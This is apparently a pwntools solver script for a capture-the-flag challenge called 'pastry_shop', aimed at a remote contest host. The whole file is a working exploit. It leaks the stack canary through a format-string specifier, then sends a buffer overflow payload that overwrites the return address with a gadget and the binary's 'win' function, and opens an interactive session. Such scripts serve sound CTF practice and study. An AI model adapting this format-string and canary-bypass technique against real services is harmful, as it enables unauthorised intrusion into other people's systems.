#!/usr/bin/env python3
from pwn import *

exe = ELF("pastry_shop", checksec=False)
context.binary = exe
context.arch = 'amd64'
context.os = 'linux'

HOSTNAME, PORT = 'offsec.m0lecon.it', 13587

CANARY_IDX = 23
OFFSET_TO_CANARY = 72
OFFSET_TO_RIP = 88

GADGET = 0x000000000040101a


def conn():
    if args.LOCAL:
        r = process([exe.path])
    else:
        r = remote(HOSTNAME, PORT)
    return r

def main():
    r = conn()
    
    r.recvuntil(b'dear customer?\n')
    r.sendline(f"%{CANARY_IDX}$lx".encode())
    leak = r.recvline().strip()
    canary = int(leak, 16)
    log.info(f"canary = {canary:#x}")

    r.recvuntil(b'to order?\n')
    payload = flat(
        b"A" * OFFSET_TO_CANARY,
        p64(canary),
        b"B" * (OFFSET_TO_RIP - OFFSET_TO_CANARY - 8),
        p64(GADGET),
        p64(exe.sym.win),
    )
    r.send(payload)
    r.interactive()


if __name__ == '__main__':
    main()
